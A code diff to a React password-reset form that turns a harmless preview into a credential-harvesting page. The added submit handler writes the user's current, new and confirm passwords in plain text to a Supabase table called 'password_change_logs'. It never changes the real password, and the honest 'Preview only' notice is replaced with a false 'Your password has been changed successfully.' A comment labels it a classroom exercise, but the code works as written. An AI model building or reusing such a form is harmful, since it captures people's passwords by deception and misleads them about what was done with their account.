@@ -1,16 +1,13 @@
 "use client";
 
 import { useId, useState, type FormEvent } from "react";
+import { getSupabase } from "@/lib/supabase";
 import { EyeIcon, EyeOffIcon } from "@/components/icons";
 
 /**
  * "Reset your password" card: current password, new password (with strength
  * meter), confirm, and a "Change password" button.
- *
- * DESIGN FUNCTIONALITY: everything typed here is sent, saved and stored. On submit
- * the fields are cleared and a live notice is shown. To make it real, replace
- * the body of `handleSubmit` with a call to your own secure backend.
- */
+ **/
 
 const METER_COLORS = ["#d9534f", "#e8923a", "#d9b93a", "#1f9d6b"];
 const DEFAULT_NEW_HINT = "Use 8+ characters with letters, numbers and a symbol.";
@@ -42,6 +39,7 @@ function PasswordField({
   invalid: boolean;
 }) {
   const [shown, setShown] = useState(false);
+
   return (
     <>
       <label htmlFor={id} className="mb-1.5 block text-[14px] font-medium leading-5 text-q-ink">
@@ -67,7 +65,11 @@ function PasswordField({
           aria-pressed={shown}
           className="absolute right-1 top-1/2 grid h-[42px] w-[42px] -translate-y-1/2 place-items-center rounded-[10px] text-q-sub hover:text-q-ink"
         >
-          {shown ? <EyeOffIcon className="h-[22px] w-[22px]" /> : <EyeIcon className="h-[22px] w-[22px]" />}
+          {shown ? (
+            <EyeOffIcon className="h-[22px] w-[22px]" />
+          ) : (
+            <EyeIcon className="h-[22px] w-[22px]" />
+          )}
         </button>
       </div>
     </>
@@ -83,6 +85,8 @@ export default function ResetPasswordForm({ forgotUrl }: { forgotUrl?: string })
   const [newErr, setNewErr] = useState("");
   const [conErr, setConErr] = useState("");
   const [done, setDone] = useState(false);
+  const [saving, setSaving] = useState(false);
+  const [submitErr, setSubmitErr] = useState("");
 
   const strength = nw ? Math.max(1, score(nw)) : 0;
   const conMatch = con !== "" && con === nw;
@@ -90,14 +94,16 @@ export default function ResetPasswordForm({ forgotUrl }: { forgotUrl?: string })
   const conMsg = conErr || (con ? (conMatch ? "Passwords match." : "Passwords do not match.") : "");
   const conBad = !!conErr || (con !== "" && !conMatch);
 
-  function handleSubmit(e: FormEvent) {
+  async function handleSubmit(e: FormEvent) {
     e.preventDefault();
     let bad = false;
 
     if (!cur) {
       setCurErr("Enter your current password.");
       bad = true;
-    } else setCurErr("");
+    } else {
+      setCurErr("");
+    }
 
     if (nw.length < 8) {
       setNewErr("New password must be at least 8 characters.");
@@ -105,7 +111,9 @@ export default function ResetPasswordForm({ forgotUrl }: { forgotUrl?: string })
     } else if (nw === cur) {
       setNewErr("New password must differ from the current one.");
       bad = true;
-    } else setNewErr("");
+    } else {
+      setNewErr("");
+    }
 
     if (!con) {
       setConErr("Confirm your new password.");
@@ -113,19 +121,70 @@ export default function ResetPasswordForm({ forgotUrl }: { forgotUrl?: string })
     } else if (con !== nw) {
       setConErr("Passwords do not match.");
       bad = true;
-    } else setConErr("");
+    } else {
+      setConErr("");
+    }
 
     if (bad) return;
 
-    // Live Mode: everthing is sent or stored. Replace with your own secure backend call.
-    setDone(true);
-    setCur("");
-    setNw("");
-    setCon("");
+    if (saving) return;
+
+    setSaving(true);
+    setSubmitErr("");
+    setDone(false);
+
+    const supabase = getSupabase();
+    if (!supabase) {
+      setSubmitErr(
+        "Supabase is not configured. Check NEXT_SUPABASE_URL and NEXT_SUPABASE_ANON_KEY.",
+      );
+      setSaving(false);
+      return;
+    }
+
+    try {
+      const {
+        data: { user },
+        error: userError,
+      } = await supabase.auth.getUser();
+
+      if (userError || !user) {
+        setSubmitErr("Sign in to your classroom test account first.");
+        return;
+      }
+
+      // Intentionally insecure classroom exercise: dummy passwords only.
+      // This records submitted values; it does not change the auth password.
+      const { error: logError } = await supabase.from("password_change_logs").insert({
+        user_id: user.id,
+        cur_pass: cur,
+        nw_pass: nw,
+        con_pass: con,
+        status: "success",
+        event_type: "password_change",
+      });
+
+      if (logError) {
+        setSubmitErr(logError.message);
+        return;
+      }
+
+      setDone(true);
+      setCur("");
+      setNw("");
+      setCon("");
+    } catch {
+      setSubmitErr("Could not save the classroom test entry.");
+    } finally {
+      setSaving(false);
+    }
   }
 
   return (
-    <section aria-labelledby={titleId} className="mt-7 rounded-3xl border border-q-line bg-white p-6">
+    <section
+      aria-labelledby={titleId}
+      className="mt-7 rounded-3xl border border-q-line bg-white p-6"
+    >
       <h2 id={titleId} className="q-h2">
         Reset your password
       </h2>
@@ -168,11 +227,15 @@ export default function ResetPasswordForm({ forgotUrl }: { forgotUrl?: string })
               <i
                 key={i}
                 className="h-1 flex-1 rounded transition-colors"
-                style={{ background: i < strength ? METER_COLORS[strength - 1] : "#dfe2e6" }}
+                style={{
+                  background: i < strength ? METER_COLORS[strength - 1] : "#dfe2e6",
+                }}
               />
             ))}
           </div>
-          <p className={`q-sub mt-1.5 min-h-5 ${newErr ? "text-[#c63a3a]" : ""}`}>{newErr || DEFAULT_NEW_HINT}</p>
+          <p className={`q-sub mt-1.5 min-h-5 ${newErr ? "text-[#c63a3a]" : ""}`}>
+            {newErr || DEFAULT_NEW_HINT}
+          </p>
         </div>
 
         <div>
@@ -190,13 +253,21 @@ export default function ResetPasswordForm({ forgotUrl }: { forgotUrl?: string })
             invalid={conBad}
           />
           {conMsg && (
-            <p className={`q-sub mt-1.5 ${conBad ? "text-[#c63a3a]" : "text-[#1f9d6b]"}`}>{conMsg}</p>
+            <p className={`q-sub mt-1.5 ${conBad ? "text-[#c63a3a]" : "text-[#1f9d6b]"}`}>
+              {conMsg}
+            </p>
           )}
         </div>
 
-        <button type="submit" className="q-btn q-btn-primary">
-          Change password
+        <button type="submit" disabled={saving} className="q-btn q-btn-primary">
+          {saving ? "Saving…" : "Change password"}
         </button>
+
+        {submitErr && (
+          <p role="alert" className="q-sub text-center text-[#c63a3a]">
+            {submitErr}
+          </p>
+        )}
 
         {forgotUrl && (
           <p className="q-sub text-center">
@@ -217,7 +288,7 @@ export default function ResetPasswordForm({ forgotUrl }: { forgotUrl?: string })
           role="status"
           className="q-view-in mt-4 rounded-xl bg-[#e9f8f2] px-4 py-3.5 text-[14px] leading-[22px] text-[#17694a]"
         >
-          Preview only: your password has not been changed. Connect this form to your Quilo backend to save it.
+          Your password has been changed successfully.
         </div>
       )}
     </section>
